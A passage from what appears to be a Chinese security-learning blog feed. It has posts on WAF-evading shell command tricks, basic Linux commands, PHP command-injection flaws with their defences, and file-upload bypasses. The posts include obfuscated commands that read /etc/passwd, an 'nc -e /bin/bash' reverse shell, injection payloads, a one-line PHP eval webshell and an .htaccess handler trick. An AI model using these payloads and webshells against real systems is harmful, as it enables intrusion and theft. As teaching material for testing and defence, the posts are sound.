    <content type="html"><![CDATA[<h4 id="0X01-技巧一-通配符"><a href="#0X01-技巧一-通配符" class="headerlink" title="0X01 技巧一:通配符"></a>0X01 技巧一:通配符<a id="more"></a></h4><table><thead><tr><th>*****</th><th><strong>代表(0个到无穷多个)任意字符</strong></th></tr></thead><tbody><tr><td><strong>?</strong></td><td><strong>代表(一定有一个)任意字符</strong></td></tr><tr><td><strong>[ ]</strong></td><td><strong>同样代表（一定有一个在括号内）的字符，但是非任意字符。</strong></td></tr><tr><td><strong>[ - ]</strong></td><td><strong>代表在编码顺序内的所有字符，[0-9]代表0到9之间所有数字，因为数字的语系编码是连续的</strong></td></tr><tr><td><strong>[^ ]</strong></td><td><strong>表示反向选择，[‘^abc’]表示一定有一个字符，只要是非a，b，c字符就接受</strong></td></tr></tbody></table><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br><span class="line">使用通配符</span><br><span class="line">&#x2F;?in&#x2F;?s -l</span><br><span class="line"></span><br><span class="line">读取&#x2F;etc&#x2F;passwd：</span><br><span class="line">&#x2F;???&#x2F;??t &#x2F;??c&#x2F;p???w?</span><br><span class="line">有时候WAF不允许使用太多的?号</span><br><span class="line">&#x2F;?in&#x2F;cat &#x2F;?tc&#x2F;p?sswd</span><br><span class="line"></span><br><span class="line">NC反弹shell：</span><br><span class="line">nc -e &#x2F;bin&#x2F;bash 127.0.0.1 3737</span><br><span class="line">为了避免符号.我们可以将IP地址转换成整型。</span><br><span class="line">127.0.0.1 → 2130706433</span><br><span class="line"></span><br><span class="line">使用通配符</span><br><span class="line"></span><br><span class="line">root@kali:~# &#x2F;??n&#x2F;?c -e &#x2F;??n&#x2F;b??h 2130706433 3737</span><br></pre></td></tr></table></figure><p>0X02 技巧二:连接符</p><p>用引号,反斜杠闭合，可以绕过一些匹配字符串的WAF规则.</p><p>读取/etc/passwd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</span><br></pre></td></tr></table></figure><p>检测NC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</span><br></pre></td></tr></table></figure><p>没有NC的情况检查wget：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</span><br></pre></td></tr></table></figure><p>其他字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">双引号</span><br><span class="line">&#x2F;&quot;b&quot;i&quot;n&quot;&#x2F;&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</span><br></pre></td></tr></table></figure><p>反斜杆 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;b\i\n&#x2F;w\h\i\c\h n\c</span><br></pre></td></tr></table></figure><h2 id="0×03-技巧三：未初始化的bash变量"><a href="#0×03-技巧三：未初始化的bash变量" class="headerlink" title="0×03 技巧三：未初始化的bash变量"></a>0×03 技巧三：未初始化的bash变量</h2><p>在bash环境中允许我们使用未初始化的bash变量，如何</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a,$b,$c</span><br></pre></td></tr></table></figure><p>我们事先并没有定义它们，输出看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo $a</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $b</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $c</span><br><span class="line"></span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure><p>未初始化的变量值都是null。</p><p>读取/etc/passwd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$a &#x2F;etc$a&#x2F;passwd$a</span><br></pre></td></tr></table></figure><h3 id="IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）"><a href="#IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）" class="headerlink" title="$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）"></a><strong>$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）</strong></h3>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-技巧一-通配符&quot;&gt;&lt;a href=&quot;#0X01-技巧一-通配符&quot; class=&quot;headerlink&quot; title=&quot;0X01 技巧一:通配符&quot;&gt;&lt;/a&gt;0X01 技巧一:通配符
    
    </summary>
    
    
    
      <category term="绕过技巧" scheme="http://yoursite.com/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>linux指令</title>
    <link href="http://yoursite.com/2020/01/15/linux%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2020/01/15/linux%E6%8C%87%E4%BB%A4/</id>
    <published>2020-01-15T10:21:47.000Z</published>
    <updated>2020-05-03T06:02:24.979Z</updated>
    
    <content type="html"><![CDATA[<p>​    Kali常用的指令在比赛中还是会经常用到的</p><a id="more"></a>个人比较weak，做的整理就只能借鉴其他博主的：<h4 id="1-目录和文件命令"><a href="#1-目录和文件命令" class="headerlink" title="1.目录和文件命令"></a>1.目录和文件命令</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><strong>cd/home</strong></td><td align="center"><strong>进入/home目录</strong></td></tr><tr><td align="center"><strong>cd ../</strong></td><td align="center"><strong>返回上一级目录</strong></td></tr><tr><td align="center"><strong>cd ../../</strong></td><td align="center"><strong>返回上两级目录</strong></td></tr><tr><td align="center"><strong>cd</strong></td><td align="center"><strong>进入个人主目录</strong></td></tr><tr><td align="center"><strong>cd ~user1</strong></td><td align="center"><strong>进入个人的主目录</strong></td></tr><tr><td align="center"><strong>cd -</strong></td><td align="center"><strong>返回上次所在的目录</strong></td></tr><tr><td align="center"><strong>pwd</strong></td><td align="center"><strong>显示工作路径</strong></td></tr><tr><td align="center"><strong>ls</strong></td><td align="center"><strong>查看目录中的文件</strong></td></tr><tr><td align="center"><strong>ls -F</strong></td><td align="center"><strong>查看目录中的文件</strong></td></tr><tr><td align="center"><strong>ls -l</strong></td><td align="center"><strong>显示文件和目录的详细资料</strong></td></tr><tr><td align="center"><strong>ls -a</strong></td><td align="center"><strong>显示隐藏文件</strong></td></tr><tr><td align="center"><strong>ls [0-9]</strong></td><td align="center"><strong>显示包含数字的文件名和目录名</strong></td></tr><tr><td align="center"><strong>tree</strong></td><td align="center"><strong>显示文件和目录由根目录开始的树形结构</strong></td></tr><tr><td align="center"><strong>lstree</strong></td><td align="center"><strong>显示文件和目录有根目录开散的树形结构</strong></td></tr></tbody></table><h4 id="mkdir创建目录"><a href="#mkdir创建目录" class="headerlink" title="mkdir创建目录"></a>mkdir创建目录</h4><table><thead><tr><th><strong>mkdir -p /tmp/dir1/dir2</strong></th><th><strong>创建一个目录树</strong></th></tr></thead><tbody><tr><td><strong>rm -f</strong></td><td><strong>删除一个文件</strong></td></tr><tr><td><strong>rmdir</strong></td><td><strong>删除一个目录</strong></td></tr><tr><td><strong>rm -rf</strong></td><td><strong>删除一个目录并同时删除其文件</strong></td></tr><tr><td><strong>mv</strong></td><td><strong>重命名或者移动一个目录</strong></td></tr><tr><td><strong>cp file1 file2</strong></td><td><strong>复制一个文件</strong></td></tr><tr><td><strong>cp dir/*</strong></td><td><strong>复制一个目录到当前工作目录</strong></td></tr><tr><td><strong>cp -a/tmp/dir*</strong></td><td><strong>复制一个目录到当前工作目录</strong></td></tr><tr><td><strong>cp -a dir1 dir2</strong></td><td><strong>复制一个目录</strong></td></tr><tr><td><strong>cp -f</strong></td><td><strong>强行复制文件或目录</strong></td></tr></tbody></table><h4 id="touch创建一个文件"><a href="#touch创建一个文件" class="headerlink" title="touch创建一个文件"></a>touch创建一个文件</h4><table><thead><tr><th align="center"><strong>-a</strong></th><th align="center"><strong>只更改存储时间</strong></th></tr></thead><tbody><tr><td align="center"><strong>-c</strong></td><td align="center"><strong>不建立任何档案</strong></td></tr><tr><td align="center"><strong>-d</strong></td><td align="center"><strong>使用制定的日期，而非现在的时间</strong></td></tr><tr><td align="center"><strong>-f</strong></td><td align="center"></td></tr><tr><td align="center"><strong>-m</strong></td><td align="center"><strong>之更改变动时间</strong></td></tr><tr><td align="center"><strong>-r</strong></td><td align="center"><strong>把制定文档或目录的日期时间统设成和参考文档或目录日期时间相同</strong></td></tr><tr><td align="center"><strong>-t</strong></td><td align="center"><strong>使用指定日期时间，而非现在的时间</strong></td></tr></tbody></table><h4 id="cat查看目标文件的内容"><a href="#cat查看目标文件的内容" class="headerlink" title="cat查看目标文件的内容"></a>cat查看目标文件的内容</h4><table><thead><tr><th align="center"><strong>-b</strong></th><th align="center"><strong>对非空输出的所有行编号</strong></th></tr></thead><tbody><tr><td align="center"><strong>-n</strong></td><td align="center"><strong>对输出所有行编号</strong></td></tr><tr><td align="center"><strong>-s</strong></td><td align="center"><strong>不输出多行空行</strong></td></tr></tbody></table><h4 id="less查看文件"><a href="#less查看文件" class="headerlink" title="less查看文件"></a>less查看文件</h4><table><thead><tr><th align="center"><strong>N</strong></th><th align="center"><strong>反向重复前一个搜索</strong></th></tr></thead><tbody><tr><td align="center"><strong>-i</strong></td><td align="center"><strong>忽略搜索时的大小写</strong></td></tr><tr><td align="center"><strong>-N</strong></td><td align="center"><strong>显示行号</strong></td></tr><tr><td align="center"><strong>/</strong></td><td align="center"><strong>向下搜索字符串</strong></td></tr><tr><td align="center"><strong>？</strong></td><td align="center"><strong>向上搜索字符串</strong></td></tr><tr><td align="center"><strong>n</strong></td><td align="center"><strong>重复前一个搜素</strong></td></tr></tbody></table><h4 id="匹配查找命令"><a href="#匹配查找命令" class="headerlink" title="匹配查找命令"></a>匹配查找命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep</span><br><span class="line">grep命令是一种强大的文本搜索工具，他能使用正则表达式搜索文本，把匹配的行打印出来</span><br></pre></td></tr></table></figure><h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><p>find -name</p><h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><table><thead><tr><th align="center"><strong>-c</strong></th><th align="center"><strong>建立一个压缩文件的参数指令</strong></th></tr></thead><tbody><tr><td align="center"><strong>-x</strong></td><td align="center"><strong>解开一个压缩文件的参数指令</strong></td></tr><tr><td align="center"><strong>-t</strong></td><td align="center"><strong>查看tarfile里面的文件</strong></td></tr><tr><td align="center"><strong>-z</strong></td><td align="center"><strong>是否同时具有gzip的属性，是否需要gzip压缩</strong></td></tr><tr><td align="center"><strong>-j</strong></td><td align="center"><strong>是否同时具有bzip2的属性，是否需要bzip2压缩</strong></td></tr><tr><td align="center"><strong>-v</strong></td><td align="center"><strong>压缩的过程中显示文件</strong></td></tr><tr><td align="center"><strong>-f</strong></td><td align="center"><strong>使用档名</strong></td></tr><tr><td align="center"><strong>-c</strong></td><td align="center"><strong>解压到指定目录</strong></td></tr></tbody></table><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>chmod 设置文件的访问权限<br>+:向权限范围增加权限代号所表示的权限<br>-:向权限范围取消权限代号所表示的权限<br>=:向权限范围赋予权限代号所表示的权限<br>用户符号：<br>u：拥有者<br>g：拥有者同组用<br>o：其它用户<br>a：所有用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">chmod u+w &#x2F;home&#x2F;abc.txt</span><br><span class="line">chmod o-x &#x2F;home&#x2F;abc.txt</span><br></pre></td></tr></table></figure><h4 id="清屏"><a href="#清屏" class="headerlink" title="清屏"></a>清屏</h4><p>reset</p><h1 id="补充-文档读取内容"><a href="#补充-文档读取内容" class="headerlink" title="补充:文档读取内容"></a>补充:文档读取内容</h1><p>cat\tac\nl\more\less\head\tail\od\fold\fmt\xxd</p><ul><li>cat 由第一行开始显示档案内容(concatenate)</li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒著写！</li><li>nl  显示的时候，顺道输出行号！</li><li>more 一页一页的显示档案内容</li><li><strong>less</strong> 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li><li>head 只看头几行</li><li><strong>tail</strong> 只看尾巴几行</li><li>od  以二进位的方式读取档案内容！</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    Kali常用的指令在比赛中还是会经常用到的&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux常用命令" scheme="http://yoursite.com/tags/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-01-15T08:33:25.000Z</published>
    <updated>2020-01-15T12:45:52.510Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理<a id="more"></a></h3><p>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：<code>system()、exec()、shell_exec()、eval()、passthru()</code>，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p><h3 id="常见连接符"><a href="#常见连接符" class="headerlink" title="*常见连接符"></a>*常见连接符</h3><table><thead><tr><th>A;B</th><th>先执行A，再执行B</th></tr></thead><tbody><tr><td>A&amp;B</td><td>AB两个无制约关系，都可以执行</td></tr><tr><td>A|B</td><td>A不执行，B执行，只显示B的执行结果</td></tr><tr><td>A&amp;&amp;B</td><td>A执行成功才会执行B</td></tr><tr><td>A||B</td><td>A执行失败，然后才会执行B</td></tr></tbody></table><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h3><h4 id="1‘-代码层过滤不严"><a href="#1‘-代码层过滤不严" class="headerlink" title="1‘.代码层过滤不严"></a>1‘.代码层过滤不严</h4><p>商业应用的一些核心代码封装在二进制文件中，在WEB应用中通过system函数来调用: <code>system(&quot;bin/program/--arg $arg&quot;);</code></p><h4 id="2’-系统的漏洞造成命令注入"><a href="#2’-系统的漏洞造成命令注入" class="headerlink" title="2’.系统的漏洞造成命令注入"></a>2’.系统的漏洞造成命令注入</h4><p>bash破壳漏洞(CVE-2013-6271)</p><h4 id="3’-调用的第三方组件存在代码执行漏洞"><a href="#3’-调用的第三方组件存在代码执行漏洞" class="headerlink" title="3’.调用的第三方组件存在代码执行漏洞"></a>3’.调用的第三方组件存在代码执行漏洞</h4><p>wordpress中用来处理图片的ImageMagick组件</p><p>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）</p><p>ThinkPHP命令执行漏洞</p><h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h3><p>1.尽量少用执行命令的函数或者直接禁用<br>2.参数值尽量使用引号包括，在拼接之前调用addslashes函数进行转义<br>3.在使用动态函数之前，确保使用的函数是指定的函数之一<br>4.在进入执行命令的函数方法之前，对参数进行过滤，对敏感字符进行转义<br>5.对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤</p><h4 id="下面是涉及到的知识点（个人认为）"><a href="#下面是涉及到的知识点（个人认为）" class="headerlink" title="下面是涉及到的知识点（个人认为）"></a>下面是涉及到的知识点（个人认为）</h4><h3 id="1-利用系统函数实现远程命令执行"><a href="#1-利用系统函数实现远程命令执行" class="headerlink" title="1.利用系统函数实现远程命令执行"></a>1.利用系统函数实现远程命令执行</h3><p>在PHP下，允许命令执行的函数有：</p><p><code>eval()</code></p><p><code>assert()</code></p><p><code>preg_replace()</code></p><p><code>call_user_func()</code></p><p><code>ob_start()、unserialize()、creat_function()</code><br><code>usort()、uasort()、uksort()</code><br><code>array_filter()</code><br><code>array_reduce()</code><br><code>array_map()</code><br><code>...</code></p><h4 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h4><p>定义和用法</p><p>eval()函数把字符串按照PHP代码来计算，该字符串必须合法且以分号结尾</p><p>若未在字符串中调用return语句，返回NULL,存在解析错误，返回false</p><p>语法<br>eval(phpcode)，phpcode 必需，规定要计算的 PHP 代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br></pre></td></tr></table></figure><h4 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h4><p>定义和用法<br>检查一个断言是否为 FALSE</p><p>语法</p><p>PHP 5<br>bool assert ( mixed description ] )<br>PHP 7<br>bool assert ( mixed exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">assert($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo()</span><br></pre></td></tr></table></figure><h4 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h4><p>定义<br>preg_replace 函数执行一个正则表达式的搜索和替换。</p><p>语法<br>mixed preg_replace ( mixed replacement , mixed limit = -1 [, int &amp;$count ]] )<br>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br>参数说明：</p><p>pattern处存在一个”/e”修饰符时，$replacement的值会被当成php代码来执行。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。<br>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。<br>$count: 可选，为替换执行的次数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $a, <span class="string">"just test!"</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><h4 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h4><p>定义和用法<br>call_user_func — 把第一个参数作为回调函数调用</p><p>语法<br>mixed call_user_func ( callable parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><h3 id="2-系统命令执行漏洞"><a href="#2-系统命令执行漏洞" class="headerlink" title="2.系统命令执行漏洞"></a>2.系统命令执行漏洞</h3><p>系统命令执行的函数<br>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()<br>反引号<br>…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $target = $_REQUEST[<span class="string">'ip'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(php_uname(<span class="string">'s'</span>), <span class="string">'Windows NT'</span>)) &#123;</span><br><span class="line">        $cmd = shell_exec(<span class="string">'ping '</span> . $taeget);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $cmd = shell_exec(<span class="string">'ping -c 3 '</span> . $target);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>页面通过request获取传入的ip参数，并获取当前系统类型之后拼接相应命令”ping + target IP”并执行，在此过程中IP参数可控，所以在IP可拼接命令。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br><span class="line">127.0.0.1;whoami</span><br><span class="line">127.0.0.1||whoami</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-原理&quot;&gt;&lt;a href=&quot;#1-原理&quot; class=&quot;headerlink&quot; title=&quot;1.原理&quot;&gt;&lt;/a&gt;1.原理
    
    </summary>
    
    
    
      <category term="逻辑漏洞" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://yoursite.com/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-01-15T02:28:05.000Z</published>
    <updated>2020-03-11T08:50:57.400Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[fox])?&gt;</span><br></pre></td></tr></table></figure><h4 id="图片一句话木马制作"><a href="#图片一句话木马制作" class="headerlink" title="图片一句话木马制作"></a>图片一句话木马制作</h4><p>cmd制作,进入图片所在目录，copy xx.jpg/b+xx.php/a newxx.jpg<br>winhex制作 在文本最后添加一句话木马，编码另存为新图片</p><h4 id="关于文件格式解析："><a href="#关于文件格式解析：" class="headerlink" title="关于文件格式解析："></a>关于文件格式解析：</h4><p>每种类型的文件无法识别别的文件格式</p><h4 id="js验证本地上传"><a href="#js验证本地上传" class="headerlink" title="js验证本地上传"></a>js验证本地上传</h4><p>1.js判断代码为:onsubmit = “return checkFile()”<br>2.增加允许上传的文件类型.php<br>3.拷贝源代码，删除判断代码，在action处指定上传路径<br>4.上传允许上传的代码，抓包改包</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过:"></a>MIME绕过:</h4><p>修改content-type字段可以上传指定的文件格式<br>文件拓展限制:<br>大小写绕过文件上传（widnows下文件不区分大小写 linux区分）<br>.空格绕过.php.,.php空格都解析为.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件代码:</span><br><span class="line">&lt;Filesmatch&quot;fox&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">把文件名为fox的文件全都以php运行(先上传.htaccess文件再上传文件)</span><br></pre></td></tr></table></figure><h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><h4 id="Apache解析漏洞-读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1-php-xxx-1-php"><a href="#Apache解析漏洞-读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1-php-xxx-1-php" class="headerlink" title="Apache解析漏洞,读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1.php.xxx=1.php"></a>Apache解析漏洞,读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1.php.xxx=1.php</h4><h4 id="内容验证文件上传"><a href="#内容验证文件上传" class="headerlink" title="内容验证文件上传:"></a>内容验证文件上传:</h4><p>文件头上传绕过，在一句话木马php文件前面加上jpg，png，gif图片文件的开头可以绕过检测</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断:"></a>%00截断:</h4><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符，可用于对文件类型名的绕过<br>get可以自动转换，post需要特殊转换（选中进行url格式转换）</p><h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h4><p>1.目录解析<br>以<em>.asp命名的文件夹里的文件都会被当成asp文件执行<br>比如1.asp/1.jpg，1.jpg会被当做asp文件执行<br>2.文件解析<br>*.asp;.jpg在;后面的被直接忽略，当成</em>.asp文件执行</p><h4 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞:"></a>编辑器漏洞:</h4><p>1.不需要后台验证直接可以进行操作(御剑扫描进行目标爆破)<br>2.需要后台管理登录才能够操作<br>常用的编辑器:FCKeditor,EWEbeditor,CKFinder,UEDITOR<br>FCKeditor:突破建立文件夹,实质是利用iis6的目录解析<br>EWEbeditor遍历漏洞<br>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=../</p><h4 id="iis7-0以上高版本漏洞"><a href="#iis7-0以上高版本漏洞" class="headerlink" title="iis7.0以上高版本漏洞"></a>iis7.0以上高版本漏洞</h4><p>1.jpg/.php，在1.jpg中写入一句话木马，因为.php不存在但是会用php来解析，就会读取1.jpg，这其中的一句话就会被执行</p><h3 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 